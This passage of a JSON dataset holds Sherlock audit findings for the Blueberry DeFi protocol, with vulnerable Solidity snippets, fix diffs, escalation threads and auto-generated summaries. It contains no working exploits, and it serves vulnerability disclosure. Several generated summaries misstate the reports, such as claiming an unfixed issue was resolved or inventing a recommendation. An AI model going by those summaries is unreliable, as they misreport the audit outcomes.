IAuraRewarder(rewarder).rewardToken();\n            rewards[i + 1] = _getPendingReward(\n                stRewardPerShare,\n                rewarder,\n                amount,\n                lpDecimals\n            );\n        }\n\nIn the lines above we can see that only tokens that are currently available on the pool. This means that if tokens are removed then they are no longer claimable and will be lost to those entitled to shares.\n\n## Impact\n\nUsers will lose reward tokens if they are removed\n\n## Code Snippet\n\n[WAuraPools.sol#L152-L190](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L152-L190)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nReward tokens should be stored with the tokenID so that it can still be paid out even if it the extra rewardToken is removed.",
      "summary": "\nThis bug report is about an issue with reward tokens being removed from the WAuraPool/WConvexPools contract in the Sherlock Audit 2023-04-blueberry-judging project. The bug was found by 0x52 and it was identified through manual review. \n\nThe code snippet shows that only tokens that are currently available in the pool are taken into consideration when the pendingRewards function is called. This means that if tokens are removed from the pool, they will not be distributed to the users and will be locked in the contract forever. As a result, users will lose reward tokens if they are removed.\n\nThe recommendation is to store the reward tokens with the tokenID so that it can still be paid out even if the extra rewardToken is removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/128",
      "tags": [
        "Lending Pool",
        "Deposit/Reward tokens",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18505",
      "title": "M-11: AuraSpell#closePositionFarm requires users to swap all reward tokens through same router",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/122 \n\n## Found by \n0x52\n## Summary\n\nAuraSpell#closePositionFarm requires users to swap all reward tokens through same router. This is problematic as it is very unlikely that a UniswapV2 router will have good liquidity sources for all tokens and will result in users experiencing forced losses to their reward token.  \n\n## Vulnerability Detail\n\n[AuraSpell.sol#L193-L203\n](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L193-L203)\n\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n            _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n            swapRouter.swapExactTokensForTokens(\n                rewards,\n                0,\n                swapPath[i],\n                address(this),\n                type(uint256).max\n            );\n        }\n\nAll tokens are forcibly swapped through a single router.\n\n## Impact\n\nUsers will be forced to swap through a router even if it doesn't have good liquidity for all tokens\n\n## Code Snippet\n\n[AuraSpell.sol#L149-L224](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow users to use an aggregator like paraswap or multiple routers instead of only one single UniswapV2 router.",
      "summary": "\nA bug was found in the AuraSpell#closePositionFarm function of the Sherlock-Audit/2023-04-blueberry-judging repository by 0x52. This bug requires users to swap all reward tokens through the same UniswapV2 router, resulting in users experiencing forced losses to their reward token due to lack of liquidity. The code snippet responsible for this issue is located in AuraSpell.sol#L193-L203. The impact of this bug is that users are forced to swap through a router even if it doesn't have good liquidity for all tokens. The bug was found through manual review. The recommendation is to allow users to use an aggregator like paraswap or multiple routers instead of only one single UniswapV2 router.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/122",
      "tags": [
        "Uniswap",
        "Swap",
        "Configuration"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18504",
      "title": "M-10: Issue 94 from previous contest has not been fixed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118 \n\n## Found by \n0x52, Bauchibred, cducrest-brainbot, deadrxsezzz, helpMePlease, kaysoft, peanuts, tsvetanovv\n## Summary\n\n[Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94) still exists exactly even though it was marked as \"will fix\".\n\n## Vulnerability Detail\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)\n\n## Impact\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)\n\n## Code Snippet\n\n[ChainlinkAdapterOracle.sol#L77-L97](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L77-L97)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)",
      "summary": "\nThis bug report is about Issue M-10, which is related to Issue 94 from a previous contest. It was found by eight members of the Sherlock Audit team, and it has not been fixed even though it was marked as \"will fix\". The vulnerability details, impact, code snippet, and recommendation can be found in Issue 94. It was found using manual review. This issue needs to be addressed as soon as possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118",
      "tags": [
        "Stale Price",
        "Oracle",
        "Missing-Logic"
      ],
      "finders": [
        "kaysoft",
        "0x52",
        "cducrest-brainbot",
        "tsvetanovv",
        "deadrxsezzz",
        "peanuts",
        "Bauchibred",
        "helpMePlease"
      ]
    },
    {
      "id": "18503",
      "title": "M-9: Issue 290 from previous contest has not been fully addressed by fixes",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/117 \n\n## Found by \n0x52, HonorLt, cducrest-brainbot\n## Summary\n\n[Issue 290](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/290) from the previous contest points out that users may be liquidated without the chance to repay their debt. Liquidate was changed to only be allowed when repayment was allowed. While this does address some of the problem this will still fail to protect users who become liquidatable during the period of time that repay has been disabled.\n\nMEV bots are typically used to liquidate positions since it is always more profitable to liquidate the vault even if a user tries to pay off their debt on the same black that repay is enabled, they will still be liquidated because of frontrunning.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nUsers who become liquidatable during a repay pause will still be unable to save their position\n\n## Code Snippet\n\n[BlueBerryBank.sol#L487-L548](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L487-L548)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen repay is paused and then resumed, put a timer that prevents liquidations for some amount of time after (i.e. 4 hours) so that users can fairly repay their position after repayment has been resumed.",
      "summary": "\nThis bug report is about an issue from a previous contest that has not been fully addressed by the fixes. The issue is that users may be liquidated without the chance to repay their debt. MEV bots are typically used to liquidate positions, so even if a user tries to pay off their debt on the same block that repay is enabled, they will still be liquidated due to frontrunning. The impact of this is that users who become liquidatable during a repay pause will still be unable to save their position. The code snippet mentioned in the report is BlueBerryBank.sol#L487-L548. The recommendation given is to put a timer that prevents liquidations for some amount of time after repayment has been resumed, so that users can fairly repay their position.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/117",
      "tags": [
        "Missing-Logic",
        "Liquidation"
      ],
      "finders": [
        "cducrest-brainbot",
        "HonorLt",
        "0x52"
      ]
    },
    {
      "id": "18502",
      "title": "M-8: asking for the wrong address for `balanceOf()`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116 \n\n## Found by \nCh\\_301\n## Summary\n\n## Vulnerability Detail\nShortLongSpell.[openPosition()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L143-L150) pass to `_doPutCollateral()` wrong value of `balanceOf()`\n```solidity\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n```\nthe balance should be of `address(vault)`\n\n## Impact\n- `openPosition()` will never work\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n```diff\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n-            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n-                address(this)\n+                IERC20Upgradeable(vault).balanceOf(address(this))\n            )\n        );\n```\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThis is a simple finding when you know that `SoftVault` is transferring all `uToken` to Compound to generate yield \n\nAlso of wonder the judge set this as invalid but he submitted both this and #114  in the next contest **Blueberry Update 2**\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is a simple finding when you know that `SoftVault` is transferring all `uToken` to Compound to generate yield \n> \n> Also of wonder the judge set this as invalid but he submitted both this and #114  in the next contest **Blueberry Update 2**\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nSince the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue considering this a valid medium. \n\n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Since the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue considering this a valid medium. \n> \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the code of the ShortLongSpell contract in the 2023-04-blueberry-judging Github repository. The issue is that the wrong address is being asked for the `balanceOf()` function. This issue was found by Ch_301 and was escalated for 10 USDC. \n\nThe vulnerability detail is that the `openPosition()` function passes the wrong value of `balanceOf()` to the `_doPutCollateral()` function. The impact of this issue is that `openPosition()` will never work. The code snippet of the issue is provided in the report. The tool used to find the issue was Manual Review. \n\nThe recommendation for the issue is to change the code snippet as shown in the report. The discussion section shows that the issue was accepted as a valid medium as the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue. \n\nThus, this bug report is about an issue found in the code of the ShortLongSpell contract in the 2023-04-blueberry-judging Github repository. The issue was found by Ch_301 and was accepted as a valid medium. The impact of this issue is that `openPosition()` will never work. The recommendation is to change the code snippet as shown in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116",
      "tags": [
        "Vault",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18501",
      "title": "M-7: BlueBerryBank#getPositionValue causes DOS if reward token is added that doens't have an oracle",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/115 \n\n## Found by \n0x52, nobody2018\n## Summary\n\ncollToken.pendingRewards pulls the most recent reward list from Aura/Convex. In the event that reward tokens are added to pools that don't currently have an oracle then it will DOS every action (repaying, liquidating, etc.). While this is only temporary it prevents liquidation which is a key process that should have 100% uptime otherwise the protocol could easily be left with bad debt.\n\n## Vulnerability Detail\n\n[BlueBerryBank.sol#L408-L413](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L408-L413)\n\n          (address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n              pos.collToken\n          ).pendingRewards(pos.collId, pos.collateralSize);\n          for (uint256 i; i < tokens.length; i++) {\n              rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n          }\n\nUsing the pendingRewards method pulls a fresh list of all tokens. When a token is added as a reward but can't be priced then the call to getTokenValue will revert. Since getPostionValue is used in liquidations, it temporarily breaks liquidations which in a volatile market can cause bad debt to accumulate.\n\n## Impact\n\nTemporary DOS to liquidations which can result in bad debt\n\n## Code Snippet\n\n[BlueBerryBank.sol#L392-L417](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L392-L417)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nReturn zero valuation if extra reward token can't be priced.",
      "summary": "\nThis bug report is about BlueBerryBank#getPositionValue which is a function in the BlueBerryBank.sol file. It is found by 0x52, nobody2018 and it causes a Denial-of-Service (DOS) attack if reward tokens are added to pools that don't have an oracle. This means that liquidations, which are a key process that should have 100% uptime, are temporarily prevented which can result in bad debt accumulating in a volatile market. \n\nThe code snippet for this vulnerability can be found in BlueBerryBank.sol#L392-L417. It was found through manual review. \n\nThe recommendation for this bug is to return a zero valuation if extra reward tokens can't be priced. This should prevent the DOS attack and keep the liquidation process running smoothly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/115",
      "tags": [
        "Oracle",
        "Liquidation",
        "Denial-Of-Service"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18500",
      "title": "M-6: M-03 wrong token address on `ShortLongSpell.sol`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/114 \n\n## Found by \nCh\\_301\n## Summary\n\n## Vulnerability Detail\n[ShortLongSpell.openPosition()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#LL111C4-L151C6) send `uToken` to SoftVault then deposit it into the Compound protocol to earn a passive yield. In return, SPELL receives share tokes of SoftVault  `address(strategy.vault)`  \n\n`WERC20.sol` should receive `address(strategy.vault)` token, but the logic of `ShortLongSpell.sol` subcall (WERC20.sol) `wrapper.burn()` and pass the `uToken` address (please check the Code Snippet part) instead of `strategy.vault` address\n\n## Impact\nShort/Long Spell will never work\n\n## Code Snippet\n1- https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L128-L141\n```solidity\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n```\n2- https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L229-L234\n```solidity\n        // 1. Take out collateral\n        bank.takeCollateral(param.amountPosRemove);\n        werc20.burn(\n            address(ISoftVault(strategy.vault).uToken()),\n            param.amountPosRemove\n        );\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n1- \n```diff\n-            address burnToken = address(ISoftVault(strategy.vault).uToken());\n+            address burnToken = strategy.vault;\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n```\n2- \n```diff\n        // 1. Take out collateral\n        bank.takeCollateral(param.amountPosRemove);\n        werc20.burn(\n-            address(ISoftVault(strategy.vault).uToken()),\n+            strategy.vault,\n            param.amountPosRemove\n        );\n```\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThe same reason as #116 but in a different implementation and it needs another solution \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> The same reason as #116 but in a different implementation and it needs another solution \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nThis is a valid issue\n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> This is a valid issue\n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the ShortLongSpell.sol contract, which is part of the Sherlock Audit 2023-04-blueberry-judging project. The issue is that the wrong token address is being passed to the SoftVault contract. This means that the Short/Long Spell will never work.\n\nThe issue was found by Ch_301 and confirmed by hrishibhat. It was then escalated for 10 USDC. The bug was caused because the `uToken` address was being passed instead of the `strategy.vault` address.\n\nThe issue can be fixed by changing the code snippet in two places. The first code snippet is located at ShortLongSpell.sol#L128-L141, and the second is located at ShortLongSpell.sol#L229-L234. The changes should be made according to the recommendations given in the report.\n\nAfter the issue is fixed, the contestants' payouts and scores will be updated according to the changes made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/114",
      "tags": [
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18499",
      "title": "M-5: `getPositionRisk()` will return a wrong value of risk",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/97 \n\n## Found by \nCh\\_301\n## Summary\nIn order to interact with SPELL the users need to `lend()` some collateral which is known as **Isolated Collateral** and the SoftVault will deposit them into Compound protocol to generate some lending interest (to earn passive yield)  \n\n## Vulnerability Detail\nto [liquidate](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L487-L548) a position this function `isLiquidatable()` should return `true`\n```solidity\n    function isLiquidatable(uint256 positionId) public view returns (bool) {\n        return\n            getPositionRisk(positionId) >=\n            banks[positions[positionId].underlyingToken].liqThreshold;\n    }\n```\nand it is subcall to `getPositionRisk()`\n```solidity\n    function getPositionRisk(\n        uint256 positionId\n    ) public view returns (uint256 risk) {\n        uint256 pv = getPositionValue(positionId);          \n        uint256 ov = getDebtValue(positionId);             \n        uint256 cv = getIsolatedCollateralValue(positionId);\n\n        if (\n            (cv == 0 && pv == 0 && ov == 0) || pv >= ov // Closed position or Overcollateralized position\n        ) {\n            risk = 0;\n        } else if (cv == 0) {\n            // Sth bad happened to isolated underlying token\n            risk = Constants.DENOMINATOR;\n        } else {\n            risk = ((ov - pv) * Constants.DENOMINATOR) / cv;\n        }\n    }\n```\nas we can see the `cv`  is a critical value in terms of the calculation of `risk `\nthe `cv` is returned by `getIsolatedCollateralValue()`\n\n```solidity\n    function getIsolatedCollateralValue(\n        uint256 positionId\n    ) public view override returns (uint256 icollValue) {\n        Position memory pos = positions[positionId];\n        // NOTE: exchangeRateStored has 18 decimals.\n        uint256 underlyingAmount;\n        if (_isSoftVault(pos.underlyingToken)) {\n            underlyingAmount =                                              \n                (ICErc20(banks[pos.debtToken].bToken).exchangeRateStored() * \n                    pos.underlyingVaultShare) /\n                Constants.PRICE_PRECISION; \n        } else {\n            underlyingAmount = pos.underlyingVaultShare;\n        }\n        icollValue = oracle.getTokenValue(\n            pos.underlyingToken,\n            underlyingAmount\n        );\n    }\n ```\nand it uses `exchangeRateStored()` to ask Compound (CToken.sol) for the exchange rate \n[from `CToken` contract ](https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#LL281C18-L281C18)\n```diff\nThis function does not accrue interest before calculating the exchange rate\n``` \nso the `getPositionRisk()` will return a wrong value of risk because the interest does not accrue for this position \n\n## Impact\nthe user (position) could get liquidated even if his position is still healthy \n  \n## Code Snippet\nhttps://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#LL270C1-L286C6\n```solidity\n    /**\n     * @notice Accrue interest then return the up-to-date exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateCurrent() override public nonReentrant returns (uint) {\n        accrueInterest();\n        return exchangeRateStored();\n    }\n\n    /**\n     * @notice Calculates the exchange rate from the underlying to the CToken\n     * @dev This function does not accrue interest before calculating the exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateStored() override public view returns (uint) {\n        return exchangeRateStoredInternal();\n    }\n```    \n## Tool used\n\nManual Review\n\n## Recommendation\nYou shoud use `exchangeRateCurrent()` to  Accrue interest first.\n\n\n\n## Discussion\n\n**Gornutz**\n\nSince we are using a view function we are unable to use `exchangeRateCurrent()` we have to use `exchangeRateStored()` \n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThe sponsor confirms that. so the user could get liquidated even in case his position is still healthy. \nI believe the rules are clear on that \nHe decided to not fix it but the risk still exists   \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> The sponsor confirms that. so the user could get liquidated even in case his position is still healthy. \n> I believe the rules are clear on that \n> He decided to not fix it but the risk still exists   \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nCan be a valid medium\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nAlthough the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Although the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the `getPositionRisk()` function, which is used to calculate the risk of a position and determine if it is liquidatable. It was found by Ch_301 and is located in the BlueBerryBank.sol contract. This function calls the `getIsolatedCollateralValue()` function, which is used to get the collateral value of a position. This function in turn calls the `exchangeRateStored()` function, which is located in the CToken.sol contract. This function does not accrue interest before calculating the exchange rate, resulting in a wrong value of risk being returned. This can cause a user's position to be liquidated even if it is still healthy. It was recommended to use the `exchangeRateCurrent()` function to accrue interest first. This recommendation was accepted and the issue was closed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/97",
      "tags": [
        "Liquidation",
        "External Contract",
        "External Call",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18498",
      "title": "M-4: Users can fail to closePositionFarm and lose their funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/64 \n\n## Found by \nBauer\n## Summary\nIf self.is_killed in the curve pool contract  becomes true, user may be unable to call the `CurveSpell.closePositionFarm()` function to  repay his debt, resulting in his assets being liquidated.\n\n\n## Vulnerability Detail\nThe `CurveSpell.closePositionFarm()` function is used to unwind a position on a strategy that involves farming CRV rewards through staking LP tokens in a Curve pool. Inside the function, the protocol swaps the harvested CRV tokens to the debt token, and calculates the actual amount of LP tokens to remove from the Curve pool. It then removes the LP tokens using the remove_liquidity_one_coin function of the Curve pool. \n```solidity\n   int128 tokenIndex;\n            for (uint256 i = 0; i < tokens.length; i++) {\n                if (tokens[i] == pos.debtToken) {\n                    tokenIndex = int128(uint128(i));\n                    break;\n                }\n            }\n\n            ICurvePool(pool).remove_liquidity_one_coin(\n                amountPosRemove,\n                int128(tokenIndex),\n                0\n            );\n        }\n\n        // 5. Withdraw isolated collateral from Bank\n        _doWithdraw(param.collToken, param.amountShareWithdraw);\n\n        // 6. Repay\n        {\n            // Compute repay amount if MAX_INT is supplied (max debt)\n            uint256 amountRepay = param.amountRepay;\n            if (amountRepay == type(uint256).max) {\n                amountRepay = bank.currentPositionDebt(bank.POSITION_ID());\n            }\n            _doRepay(param.borrowToken, amountRepay);\n        }\n\n        _validateMaxLTV(param.strategyId);\n```\nIf self.is_killed in the curve pool contract  becomes true, calling such `remove_liquidity_one_coin()` function would always revert. In this case, calling the `CurveSpell.closePositionFarm()` function reverts. When user's position is about to be liquidated, if the `closePositionFarm()` function is DOS'ed,user may be unable to repay his debt, resulting in the user losing their funds\n```solidity\ndef remove_liquidity_one_coin(\n    _token_amount: uint256,\n    i: int128,\n    _min_amount: uint256\n) -> uint256:\n    \"\"\"\n    @notice Withdraw a single coin from the pool\n    @param _token_amount Amount of LP tokens to burn in the withdrawal\n    @param i Index value of the coin to withdraw\n    @param _min_amount Minimum amount of coin to receive\n    @return Amount of coin received\n    \"\"\"\n    assert not self.is_killed  # dev: is killed\n\n    dy: uint256 = 0\n    dy_fee: uint256 = 0\n    dy, dy_fee = self._calc_withdraw_one_coin(_token_amount, i)\n\n```\n\n## Impact\nIf self.is_killed in the curve pool contract  becomes true, user may be unable to repay his debt, resulting in his assets being liquidated.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L197\n\n## Tool used\n\nManual Review\n\n## Recommendation",
      "summary": "\nThis bug report is about an issue with the CurveSpell.closePositionFarm() function in the Curve pool contract. If the self.is_killed variable in the Curve pool contract becomes true, it is not possible to call the remove_liquidity_one_coin() function which is used to unwind a position on a strategy that involves farming CRV rewards through staking LP tokens in a Curve pool. This would result in users not being able to repay their debt and losing their funds. The vulnerability was found manually and the code snippet provided in the report is from the CurveSpell.sol#L197 file. It is recommended to check the self.is_killed variable in the Curve pool contract to prevent users from losing their funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/64",
      "tags": [
        "Missing-Logic",
        "Liquidation",
        "Lending Pool",
        "Fund Lock",
        "Denial-Of-Service"
      ],
      "finders": [
        "Bauer"
      ]
    },
    {
      "id": "18497",
      "title": "M-3: The protocol  will not be able to add liquidity on the curve with another token with a balance.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47 \n\n## Found by \nBauer, nobody2018\n## Summary\nThe `CurveSpell` protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\n\n## Vulnerability Detail\nThe  `openPositionFarm()` function enables user to open a leveraged position in a yield farming strategy by borrowing funds and using them to add liquidity to a Curve pool, while also taking into account certain risk management parameters such as maximum LTV and position size. When add liquidity on curve ,the protocol use the borrowed token and the collateral token, it checks the number of tokens in the pool and creates an array of the supplied token amounts to be passed to the add_liquidity function. Then the curve will transfer the tokens from the protocol and mint lp tokens to the protocol. However, the protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\n```solidity\n // 3. Add liquidity on curve\n        _ensureApprove(param.borrowToken, pool, borrowBalance);\n        if (tokens.length == 2) {\n            uint256[2] memory suppliedAmts;\n            for (uint256 i = 0; i < 2; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 3) {\n            uint256[3] memory suppliedAmts;\n            for (uint256 i = 0; i < 3; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 4) {\n            uint256[4] memory suppliedAmts;\n            for (uint256 i = 0; i < 4; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        }\n\n```\n\n## Impact\nThe protocol  will not be able to add liquidity on the curve with another token with a balance.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L90-L115\n## Tool used\n\nManual Review\n\n## Recommendation\nAllow the curve pool to spend tokens that have a balance in the protocol to add liquidity",
      "summary": "\nThis bug report is about the `CurveSpell` protocol, which is used to open leveraged positions in a yield farming strategy. The protocol only ensures approve curve pool to spend its borrow token, and hence it will not be able to add liquidity on the curve with another token with a balance. This is because the `openPositionFarm()` function creates an array of the supplied token amounts to be passed to the add_liquidity function, but it only checks the number of tokens in the pool and not the balance of the tokens.\n\nThe impact of this bug is that the protocol will not be able to add liquidity on the curve with another token with a balance. The code snippet for this bug can be found at https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L90-L115. This bug was found by Bauer and nobody2018 using manual review.\n\nThe recommendation to fix this bug is to allow the curve pool to spend tokens that have a balance in the protocol to add liquidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47",
      "tags": [
        "Missing-Logic",
        "Deposit/Reward tokens",
        "Coding-Bug"
      ],
      "finders": [
        "Bauer",
        "nobody2018"
      ]
    },
    {
      "id": "18496",
      "title": "M-2: AuraSpell openPositionFarm does not join pool",
      "impact": "MEDIUM",
